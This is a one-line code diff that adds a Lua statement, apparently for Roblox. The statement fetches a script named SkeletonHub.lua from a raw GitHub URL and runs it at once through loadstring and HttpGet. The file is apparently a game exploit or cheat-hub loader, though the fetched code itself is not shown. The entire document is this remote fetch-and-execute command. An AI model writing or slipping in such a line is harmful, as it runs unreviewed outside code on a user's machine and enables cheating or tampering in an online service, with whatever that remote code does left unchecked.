@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TheJonkler7/SkeletonHub/main/SkeletonHub.lua"))()
